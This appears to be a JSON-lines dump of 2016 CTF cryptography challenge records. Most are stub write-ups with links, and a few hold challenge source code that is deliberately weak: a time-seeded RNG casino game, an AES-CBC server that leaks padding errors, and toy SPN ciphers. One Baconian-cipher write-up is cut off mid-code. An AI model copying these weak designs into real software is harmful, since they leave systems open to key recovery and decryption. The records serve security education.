{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\abctf-2016\\crypto\\old-rsa-70", "year": "2016", "name": "old-rsa-70", "writeup": "# ABCTF 2016 : old-rsa-70\n\n**Category:** Crypto\n**Points:** 70\n**Solves:** 168\n**Description:**\n\nI'm sure you can retrieve the flag from this file.\n[HINT] Some good math skills may help.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Kimiyuki Onaka](https://kimiyuki.net/blog/2016/07/23/abctf-2016/)\n* [OMECA](https://github.com/nbrisset/CTF/blob/master/abctf-2016/challenges/old-rsa-70)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\abctf-2016\\crypto\\sexy-rsa-160", "year": "2016", "name": "sexy-rsa-160", "writeup": "# ABCTF 2016 : sexy-rsa-160\n\n**Category:** Crypto\n**Points:** 160\n**Solves:** 94\n**Description:**\n\nCheck this out!\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Kimiyuki Onaka](https://kimiyuki.net/blog/2016/07/23/abctf-2016/)\n* [ATX 2600](https://ctftime.org/writeup/3621)\n* [P_TE](https://p-te.fr/2016/07/23/abctf-sexy-rsa/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\abctf-2016\\crypto\\yummi-60", "year": "2016", "name": "yummi-60", "writeup": "# ABCTF 2016 : yummi-60\n\n**Category:** Crypto\n**Points:** 60\n**Solves:** 146\n**Description:**\n\nWell this image means something and we need you to figure it out!\n[HINT] Water -> Fish, Mud -> ???\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Kimiyuki Onaka](https://kimiyuki.net/blog/2016/07/23/abctf-2016/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\alictf-2016\\crypto\\showmethemoney-50", "year": "2016", "name": "showmethemoney-50", "writeup": "# ALICTF 2016 : showmethemoney-50\n\n**Category:** Crypto\n**Points:** 50\n**Solves:**\n**Description:**\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\actf-casino-120", "year": "2016", "name": "actf-casino-120", "writeup": "# angstromCTF 2016 : actf-casino-120\n\n**Category:** Crypto\n**Points:** \n**Solves:** \n**Description:**\n\n> angstromCTF has set up a new CTF mini-game, running at web.angstromctf.com:1342. The code running the server has been released here. Win the game and get the flag! \n> \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n", "solution_code": "\n# casino.py\n#seed = xxxx\n#flag = \"REDACTED\"\n\nimport random,time\n\nrandom.seed(seed+time.time())\n\nmoney = 100\n\nprint(\"Welcome to the angstromCTF casino, where luck rules supreme.\")\nprint(\"The way the game works is that you specify a range, your guess for the number that the RNG chooses, and your wager.\")\nprint(\"If your guess is correct you win (upper_bounds - lower_bounds) * wager dollars.\")\nprint(\"As a token of appreciation for play our CTF we will give you 100 dollars to start off.\")\nprint(\"If you win 1,000,000,000 you get the flag. Good luck.\")\nwhile money > 0:\n    print(\"You have\", money, \"dollars\")\n    lower = int(input(\"Your lower bound for the range: \"))\n    upper = int(input(\"Your upper bound for the range: \"))\n    guess = int(input(\"Your guess: \"))\n    wager = int(input(\"Your wager: \"))\n\n    if wager > money:\n        print(\"your wager was too high\\n\")\n        continue\n    if wager < 0:\n        print(\"your wager was negative\\n\")\n        continue\n    if lower > upper:\n        print(\"lower bounds must be less than upper bound\\n\")\n        continue\n    \n    money -= wager\n    \n    num = random.randint(lower,upper)\n    if num == guess:\n        print(\"You guessed the right answer, you got\", (upper-lower)*wager, \"dollars\")\n        money += (upper-lower)*wager\n    else:\n        print(\"The correct number was\", num)\n\n    print()\n\n    if money > 1000000000:\n        print(flag)\n\nprint(\"You lose, better luck next time.\")\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\artifact-20", "year": "2016", "name": "artifact-20", "writeup": "# angstromCTF 2016 : artifact-20\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> While exploring ancient ruins, a strange message was found. Can you crack the message?\n>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [D3siprox](https://ctftime.org/writeup/3082)\n* [iPush](http://ipushino.blogspot.com/2016/04/angstromctf2016-artifact-crypto-20.html)\n* [Exploit3M](https://ctftime.org/writeup/3199)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\brute-force-40", "year": "2016", "name": "brute-force-40", "writeup": "# angstromCTF 2016 : brute-force-40\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> We have found the hex string \"c8db257e50bc35bf721b11d333fe9fd6\", which we believe to be a MD5 hash.\n>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Exploit3M](https://ctftime.org/writeup/3201)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\help-center-170", "year": "2016", "name": "help-center-170", "writeup": "# angstromCTF 2016 : help-center-170\n\n**Category:** Crypto\n**Points:** \n**Solves:** \n**Description:**\n\n> We have uncovered a help server that accepts encrypted commands. See if you can break in! It's running at web.angstromctf.com:1341. \n> \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n", "solution_code": "\n# server-redacted.py\nkey = 'xxxxxxxxxxxxxxxx'\nIV =  'xxxxxxxxxxxxxxxx'\nflag = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'\n\nfrom Crypto.Cipher import AES\nimport socket\n\ndef pad(string):\n    '''uses PKCS7'''\n    strLen = len(string)\n    return string+bytes([16-len(string)%16])*(16-len(string)%16)\n\ndef unpad(string):\n    '''uses PKCS7'''\n    strip = string[-1]\n\n    if len(string) % 16 != 0: return False\n    if not 0 < strip <= 16: return False\n\n    for i in range(1,strip):\n        if string[-i-1] != strip:\n            return False\n    return string[:-strip]\n\ndef main():\n    print('Listening...')\n\n    while True:\n\n        print('Welcome to the Angstrom CTF server help center enter the encrypted text and we will give you what you want!\\n')\n        print('Enter the text followed by a \".\" then the command: \\n')\n        prompt = input()\n\n        if len(prompt) % 16 != 0:\n            continue\n\n        cipher = AES.new(key, AES.MODE_CBC, IV)\n        \n        pt = unpad(cipher.decrypt(prompt))\n        if pt == False:\n            print('Invalid padding')\n            break\n\n        start = pt.rfind(b'.')\n        cmd = pt[start+1:]\n        text = pt[:start]\n        if cmd == b'help':\n            print('exit: quit the program\\n')\n            print('echo: echos your text\\n')\n            print('flag: displays the flag\\n')\n            print('directions: in case you get lost\\n')\n            print('quote: dispenses wisdom for free\\n')\n        elif cmd == b'exit':\n            print('Goodbye\\n')\n            conn.close()\n            continue\n        elif cmd == b'echo':\n            conn.send(text + '\\n')\n        elif cmd == b'flag':\n            print('The flag is ' + flag + '\\n')\n        elif cmd == b'directions':\n            print('second star to the right, and straight on till morning')\n        elif cmd == b'quote':\n            print(unpad(cipher.decrypt(b'\\x99Hj\\xcb\\x81Qrv\\x1d0\\xe90G\\x98\\xc95')) + '\\n') #hidden wisdom\n        else:\n            print('Error, invalid command\\n' + 'Here was your text: ' + text + '\\n')\n\n    print('Exiting...')\n    s.close()\n\nmain()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\my-accountant-160", "year": "2016", "name": "my-accountant-160", "writeup": "# angstromCTF 2016 : my-accountant-160\n\n**Category:** Crypto\n**Points:** \n**Solves:** \n**Description:**\n\n> While searching through some old files we found accounting sheets that could point to nefarious business. However, we only happen to have one page in plaintext. Could you recover the key? It will be a hex-encoded string. You can access the program they used for encryption here. \n> \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n", "solution_code": "\n# account_encryption.py\n#key = 'xxxxxxxxxxxx'\n\nsBox = [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],\n [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],\n [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],\n [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]]\nsBoxInv = [[13, 3, 0, 10, 2, 9, 7, 4, 8, 15, 5, 6, 1, 12, 14, 11],\n [9, 7, 2, 12, 4, 8, 15, 5, 14, 13, 11, 1, 3, 6, 0, 10],\n [14, 2, 1, 13, 0, 11, 12, 6, 7, 9, 4, 3, 10, 5, 15, 8],\n [10, 4, 6, 15, 13, 14, 8, 3, 1, 11, 12, 0, 2, 7, 5, 9]]\n\npBox = [6, 15, 3, 8, 2, 4, 9, 7, 13, 10, 0, 1, 5, 11, 14, 12]\npBoxInv = [10, 11, 4, 2, 5, 12, 0, 7, 3, 6, 9, 13, 15, 8, 14, 1]\n\ndef P(block, permute):\n    binary = bin(block)[2:].zfill(16)\n    output = [0 for i in range(16)]\n    for i in range(16):\n        output[permute[i]] = binary[i]\n    return int(''.join(output),2)\n\ndef S(block, sub):\n    blockHex = hex(block)[2:].zfill(4)\n    output = [0 for i in range(4)]\n    for i in range(4):\n        output[i] = hex(sub[i][int(blockHex[i],16)])[2:]\n    return int(''.join(output),16)\n\ndef mix(block,key):\n    return key^block\n\ndef Eround(block,key):\n    output = mix(block,key)\n    output = S(output,sBox)\n    output = P(output,pBox)\n    return output\n\ndef encrypt(block,key1,key2,key3):\n    useBlock = int(''.join([hex(ord(i))[2:] for i in block]),16)\n    calc = Eround(useBlock,key1)\n    calc = Eround(calc,key2)\n    calc = Eround(calc, key3)\n    \n    calc = hex(calc)[2:].zfill(4)\n    return calc\n\ndef Dround(block,key):\n    output = P(block,pBoxInv)\n    output = S(output,sBoxInv)\n    output = mix(output,key)\n    return output\n\ndef decrypt(block,key1,key2,key3):\n    useBlock = int(block,16)\n    calc = Dround(useBlock,key3)\n    calc = Dround(calc,key2)\n    calc = Dround(calc,key1)\n\n    calc = hex(calc)[2:]\n\n    #what's known as a hack\n    if len(calc) == 2:\n        calc = '0' + calc[0] + '0' + calc[1]\n    elif len(calc) == 3:\n        if calc[0] == 'a' or calc[0] == '9':\n            calc = '0' + calc\n        else:\n            calc = calc[0:2] + '0' + calc[2]\n    \n    output = []\n    for i in range(0,4,2):\n        output.append(chr(int(calc[i:i+2],16)))\n    \n    return ''.join(output)\n\ndef oracle(mode,key,inFile,outFile):\n    '''The key should be hex'''\n    with open(inFile, 'r') as inText:\n        data = inText.read()\n    \n    if len(data) % 2 == 1:\n        data += '\\x00'\n\n    if len(key) != 12: return False\n    key1 = int(key[0:4],16)\n    key2 = int(key[4:8],16)\n    key3 = int(key[8:12],16)\n\n    output = ''\n    if mode == 'encrypt':\n        for i in range(0,len(data),2):\n            output += encrypt(data[i:i+2].decode(),key1,key2,key3)\n    elif mode == 'decrypt':\n        for i in range(0,len(data),4):\n            output += decrypt(data[i:i+4],key1,key2,key3)\n    else: return False\n\n    outText = open(outFile,'w')\n    outText.write(output)\n    outText.close()\n\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\randomized-cipher-250", "year": "2016", "name": "randomized-cipher-250", "writeup": "# angstromCTF 2016 : randomized-cipher-250\n\n**Category:** Crypto\n**Points:** \n**Solves:** \n**Description:**\n\n> My friend has designed a cipher based around randomized boxes in a SP network. For some reason I don't think this is secure. Could you recover the key for me? The flag is the key, hex-encoded. The server is running at web.angstromctf.com:1343. \n> \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n", "solution_code": "\n# redacted.py\n#key = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n\nimport random\n\ndef genPBox():\n    output = list(range(16))\n    random.shuffle(output)\n    return output\n\ndef genSBox():\n    output = []\n    poss = list(range(16))\n    random.shuffle(poss)\n    for i in range(4):\n        output.append([0 for i in range(4)])\n        for j in range(4):\n            output[i][j] = poss[i*4+j]\n    return output\n\ndef P(block, permute):\n    binary = bin(block)[2:].zfill(16)\n    output = [0 for i in range(16)]\n    for i in range(16):\n        output[permute[i]] = binary[i]\n    return int(\"\".join(output),2)\n\ndef S(block, sub):\n    blockHex = hex(block)[2:].zfill(4)\n    output = [0 for i in range(4)]\n    for i in range(4):\n        binary = bin(int(blockHex[i],16))[2:].zfill(4)\n        outer = int(binary[0] + binary[3],2)\n        inner = int(binary[1:3],2)\n        output[i] = hex(sub[i][outer][inner])[2:]\n    return int(\"\".join(output),16)\n\ndef mix(block,key):\n    return key^block\n\ndef Eround(block,key,pBox,sBox):\n    output = mix(block,key)\n    output = S(output,sBox)\n    output = P(output,pBox)\n    return output\n\ndef encrypt(block,keys,rounds,pBox,sBox):\n    current = int(block,16)\n    for i in range(rounds-1):\n        current = Eround(current,keys[i],pBox,sBox)\n    current = mix(current,keys[-1]) #so that last round can\"t be reversed\n\n    current = hex(current)[2:].zfill(4)\n    return current\n\ndef oracle(key, inText, rounds):\n    #not a very good padding scheme\n    while len(inText) % 4 != 0:\n        inText += \"0\"\n\n    if len(key) != 4*rounds: return False\n\n    keys = [int(key[i:i+4],16) for i in range(0,len(key),4)]\n\n    pBox = genPBox()\n    print(\"The permutation box is: \",pBox)\n    sBox = []\n    for i in range(4):\n        sBox.append(genSBox())\n        print(\"Substitution box \",i, \" is: \" , sBox[i])\n        \n    output = \"\"\n    for i in range(0,len(inText),4):\n        output += encrypt(inText[i:i+4],keys,16,pBox,sBox)\n\n    return output\n\ndef main():\n    pt = input(\"Please enter the hex-encoded string you would like to be encrypted: \")\n    ct = oracle(key,pt,16)\n    print(\"Here is the hex-encoded cipher text: \" + ct)\n\nmain()\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\rsa-fun-240", "year": "2016", "name": "rsa-fun-240", "writeup": "# angstromCTF 2016 : rsa-fun-240\n\n**Category:** Crypto\n**Points:** \n**Solves:** \n**Description:**\n\n> George was sending an encrypted message to me, as well as the RSA private key used to encrypt it. Somehow, part of the message got garbled up and then the transmission suddenly cut off. Can you recover the message George was sending? \n> \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\shakespeare-60", "year": "2016", "name": "shakespeare-60", "writeup": "# angstromCTF 2016 : shakespeare-60\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> We have uncovered a Shakespearean-era transmission that seems perfectly ordinary. Can you help us find the hidden message in this Hamlet soliloquy?\n> Hint: Who do some claim wrote the plays normally attributed to Shakespeare? The flag will be a lower-case string with no spaces.\n\n\n\n## Write-up\n\nWe are given a single Word Document for this challenge. Upon opening it with Word 2016 we find the opening of the famous soliloquy from Shakespeare's Hamlet.\n\n![Hamlet Text](https://github.com/jashanbhoora/write-ups-2016/blob/master/angstromctf-2016/crypto/shakespeare-60/shakespeare-1.jpg)\n\nThere's nothing obvious that stands out in the text, and there doesn't seem to be anything embedded in the document.\nFollowing the hint, I searched for \"Shakespeare conspiracies\", and the third result gave me what I was looking for: [The Shakespeare Authorship Question](https://en.wikipedia.org/wiki/Shakespeare_authorship_question)\n\nTo quote the page: \"The Shakespeare authorship question is the argument that someone other than William Shakespeare of Stratford-upon-Avon wrote the works attributed to him\"...\"The controversy has since spawned a vast body of literature, and more than 80 authorship candidates have been proposed, the most popular being Sir Francis Bacon; Edward de Vere, 17th Earl of Oxford; Christopher Marlowe; and William Stanley, 6th Earl of Derby.\"\n\nReading these names prompted me to start searching for encryption methods related to the supposed authors. Sir Francis Bacon was first, so I started off by searching for \"Bacon encoding\"...\nAnd what do you know! It turns out Sir Bacon devised a form of steganography that is commonly called the [Baconian Cipher](https://en.wikipedia.org/wiki/Bacon%27s_cipher)!\n\nThe Wikipedia article does a pretty good job of explaining it, so I won't go into the details here. To summarise, Baconian Ciphers encode data in the presentation of the text, and not the text itself. After a bit of thought and experimentation, I realised that the body of text we had been given used two different (but visibly identical) fonts: Calibri Light (Headings) and Calibri (Body).\n\n![Hamlet Text](https://github.com/jashanbhoora/write-ups-2016/blob/master/angstromctf-2016/crypto/shakespeare-60/shakespeare-2.jpg)\n\nI used Word's \"Select Text with Similar Formatting\" tool to grab all of one of the fonts, then used Shift+F3 to make the selection all uppercase. I also removed any non-alphabetic from the string at this point, which left me with: tOBeoRNottOBeTHATiStHeQueSTIONWHetHErTISnOBlERINTHeMInDtOSuffERThESlINGSaNDaRRowSOFoUTRAGEoUSFoRtuNeORTOTAkeARMSaGAINStaSEAofTRoUBlESANDbYOPpOSInGEnDTHEM\n\nThis then needed to be converted to the A/B string that Baconian Ciphers use. I did this with a couple of lines of Python.\n\n```python\nintext = \"tOBeoRNottOBeTHATiStHeQueSTIONWHetHErTISnOBlERINTHeMInDtOSuffERThESlINGSaNDaRRowSOFoUTRAGEoUSFoRtuNeORTOTAkeARMSaGAINSt"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\spqr-10", "year": "2016", "name": "spqr-10", "writeup": "# angstromCTF 2016 : spqr-10\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> We found this message written on a piece of parchment in the ruins of ancient Rome. What could it mean?\n>\n> uxptkx_max_bwxl_hy_ftkva\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [D3siprox](https://ctftime.org/writeup/3080)\n* [iPush](http://ipushino.blogspot.com/2016/04/angstromctf-2016-spqr-crypto-10.html)\n* [Qux BBB (Japanese)](https://github.com/qux-bbb/AngstromCTF-2016.git)\n* [Exploit3M](https://ctftime.org/writeup/3197)\n* [Soufiane Boussali](https://github.com/MrMugiwara/WriteupsCTF/blob/master/AngstromCTF2016/Crypto10/README.md)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\what-a-drag-90", "year": "2016", "name": "what-a-drag-90", "writeup": "# angstromCTF 2016 : what-a-drag-90\n\n**Category:** Crypto\n**Points:** \n**Solves:** \n**Description:**\n\n> We have found a hex string that we believe is encrypted using a multiple time pad. Can you crack it given just ciphertext? \n> \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\crypto\\what-the-hex-15", "year": "2016", "name": "what-the-hex-15", "writeup": "# angstromCTF 2016 : what-the-hex-15\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> Decode using hex and see what you get...\n>\n> 6236343a20615735305a584a755a58526659323975646d567963326c76626c3930623239736331397962324e7\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [D3siprox](https://ctftime.org/writeup/3081)\n* [iPush](http://ipushino.blogspot.com/2016/04/angstromctf-2016-what-hex-crypto-15.html)\n* [Soufiane Boussali](https://github.com/MrMugiwara/WriteupsCTF/tree/master/AngstromCTF2016/What-the-Hex)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\re\\sea-cipher-100", "year": "2016", "name": "sea-cipher-100", "writeup": "# angstromCTF 2016 : sea-cipher-100\n\n**Category:** Re\n**Points:** \n**Solves:** \n**Description:**\n\n> We have recovered an encrypted book and the encryption program used to secure it. Could you decrypt this for us, please?\n> \n> teusbfslkt_kwruzo_sjsa_kursmwfsl \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\angstromctf-2016\\re\\sea-cipher-2-170", "year": "2016", "name": "sea-cipher-2-170", "writeup": "# angstromCTF 2016 : sea-cipher-2-170\n\n**Category:** Re\n**Points:** \n**Solves:** \n**Description:**\n\n> We have recovered an encrypted book and the encryption program used to secure it. Could you decrypt this for us, please?\n> \n> teusbfslkt_kwruzo_sjsa_kursmwfsl \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-2016\\crypto\\dam-277", "year": "2016", "name": "dam-277", "writeup": "# ASIS CTF Finals 2016 : dam-277\n\n**Category:** Crypto\n**Points:** 277\n**Solves:** 14\n**Description:**\n\nCan you beat our cryptography system?\n\nnc dam.asis-ctf.ir 34979\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/dam)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-2016\\crypto\\dsa-333", "year": "2016", "name": "dsa-333", "writeup": "# ASIS CTF Finals 2016 : dsa-333\n\n**Category:** Crypto\n**Points:** 333\n**Solves:** 10\n**Description:**\n\nBy using given [code](DSA.txz) and [file](params.txt) and [pubkey](pubkey), find the private key x and send the flag as follows:\n\n\tASIS{md5(x)}\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/dsa)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-2016\\crypto\\only9-380", "year": "2016", "name": "only9-380", "writeup": "# ASIS CTF Finals 2016 : only9-380\n\n**Category:** Crypto\n**Points:** 380\n**Solves:** 8\n**Description:**\n\nMirror [mirror](Only9.txz) on wall, who is the most symmetric of them all.\n\nnc only9.asis-ctf.ir 42953\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [KITCTF](https://github.com/kitctf/writeups/tree/master/asis-finals-2016/only9)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-2016\\crypto\\races-189", "year": "2016", "name": "races-189", "writeup": "# ASIS CTF Finals 2016 : races-189\n\n**Category:** Crypto\n**Points:** 189\n**Solves:** 9\n**Description:**\n\nFind the flag by using the given [file](RACES.txz).\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Ankur Sundara](http://blog.ankursundara.com/asis-ctf-finals-2016-races/)\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/races)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\asis-ctf-2016\\crypto\\rsa-113", "year": "2016", "name": "rsa-113", "writeup": "# ASIS CTF Finals 2016 : rsa-113\n\n**Category:** Crypto\n**Points:** 113\n**Solves:** 64\n**Description:**\n\nFind the [flag](rsa.txz).\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/rsa)\n* https://kinyabitch.wordpress.com/2016/09/11/asis-ctf-finals-rsa/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-2016\\crypto\\srpp-231", "year": "2016", "name": "srpp-231", "writeup": "# ASIS CTF Finals 2016 : srpp-231\n\n**Category:** Crypto\n**Points:** 231\n**Solves:** 11\n**Description:**\n\nTry to crack our super safe [cryptography system](srpp.txz) and find the flag.\n\nnc srpp.asis-ctf.ir 22778\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/srpp)\n* https://kinyabitch.wordpress.com/2016/09/14/crypto-asis-ctf-finals-2016-srpp-secure-remote-password-protocol/\n* [RingZer0](https://github.com/tothi/ctfs/tree/master/asis-finals-ctf-2016/srpp)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-2016\\crypto\\the-imitation-game-84", "year": "2016", "name": "the-imitation-game-84", "writeup": "# ASIS CTF Finals 2016 : the-imitation-game-84\n\n**Category:** Crypto\n**Points:** 84\n**Solves:** 2\n**Description:**\n\nCheck the [file](The_Imitation_Game.txz), decrypt the message.\n\nFlag format is ASIS{md5(you_know_it_when_you_find_it)}.\n\nHint:\n\nKnowing the names of the **airline** and **movies** will help you solve this challenge.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ctftime.org/writeup/4101\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-quals-2016\\crypto\\cache-storm-241", "year": "2016", "name": "cache-storm-241", "writeup": "# ASIS CTF Quals 2016 : cache-storm-241\n\n**Category:** Crypto\n**Points:** 241\n**Solves:** 7\n**Description:**\n\nCheck the [cryptography](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/cache-storm-241/cache_storm), decrypt the message.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-quals-2016\\crypto\\epid-lid-99", "year": "2016", "name": "epid-lid-99", "writeup": "# ASIS CTF Quals 2016 : epid-lid-99\n\n**Category:** Crypto\n**Points:** 99\n**Solves:** 15\n**Description:**\n\n[Mathematicians](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/epic-lid-99/EpicLid) are forever\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-quals-2016\\crypto\\haran-333", "year": "2016", "name": "haran-333", "writeup": "# ASIS CTF Quals 2016 : haran-333\n\n**Category:** Crypto\n**Points:** 333\n**Solves:** 5\n**Description:**\n\nAfter figuring out the [cryptography system](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/Haran), decrypt the message.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\asis-ctf-quals-2016\\crypto\\kdm-rsa-156", "year": "2016", "name": "kdm-rsa-156", "writeup": "# ASIS CTF Quals 2016 : kdm-rsa-156\n\n**Category:** Crypto\n**Points:** 156\n**Solves:** 5\n**Description:**\n\n[RSA](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/kdm-rsa-156/KDM) is a simple math problem, or is it?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-quals-2016\\crypto\\my-oras1e-276", "year": "2016", "name": "my-oras1e-276", "writeup": "# ASIS CTF Quals 2016 : my-oras1e-276\n\n**Category:** Crypto\n**Points:** 276\n**Solves:** 9\n**Description:**\n\nts a nice flag that Pythia has got there. It would be a shame if someone stole it!\n\n    nc my-0RSA1e.asis-ctf.ir 31337\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-quals-2016\\crypto\\wacky-agent-75", "year": "2016", "name": "wacky-agent-75", "writeup": "# ASIS CTF Quals 2016 : wacky-agent-75\n\n**Category:** Crypto\n**Points:** 75\n**Solves:** 12\n**Description:**\n\nRookie Agent strikes again! He tried to encrypt a [message](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/wacky-agent-75/Wacky-Agent), and now has forgotten what he has done!\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [SiBears](http://sibears.ru/labs/ASIS-CTF-Quals-2016-Wacky-Agent/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\asis-ctf-quals-2016\\crypto\\zor-bit-224", "year": "2016", "name": "zor-bit-224", "writeup": "# ASIS CTF Quals 2016 : zor-bit-224\n\n**Category:** Crypto\n**Points:** 224\n**Solves:** 1\n**Description:**\n\nThe flag is encrypted using the [given code](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/zor-bit-224/ZorBit), find it.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\backdoor-ctf-2016\\crypto\\baby-200", "year": "2016", "name": "baby-200", "writeup": "# Backdoor CTF : baby-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 9\n**Description:**\n\n> z3r0c00l has a safe repository of files. The filename is signed using z3r0c00l's private key (using the PKCS-1 standard).\n> \n> Anyone willing to read a file, has to ask for a signature from z3r0c00l. But z3r0c00l is currently unavailable.\n> \n> Can you still access a file named \"flag\" on z3rc00l's repository?\n> \n> nc hack.bckdr.in 9001\n> \n> Created by: Punit Dhoot\n> \n> No. of Correct Submissions: 9\n> \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://grocid.net/2016/06/05/backdoorctf16-baby/\n"}
